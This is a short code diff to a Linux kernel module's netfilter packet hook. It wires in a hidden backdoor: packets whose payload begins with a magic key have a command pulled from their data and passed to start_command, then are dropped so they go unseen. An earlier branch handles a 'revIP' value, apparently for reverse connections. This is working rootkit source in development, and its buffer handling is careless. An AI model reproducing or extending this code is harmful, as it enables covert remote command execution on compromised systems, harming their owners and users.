@@ -78,12 +78,12 @@ static unsigned int my_nf_hookIn(void *priv,
             kfree(revIP);
             return NF_DROP;
         } 
-        else if (memcmp(user_data, cKEY, strlen(cKEY))==0)
+        else if (memcmp(user_data, cKEY, strlen(cKEY))==0) // single command
         {
             char* command = kmalloc(64, GFP_KERNEL);
             strncpy(command, user_data + 8, 64);
 
-            // TODO add execute method call here
+            start_command(command);
 
             kfree(command);
             return NF_DROP;
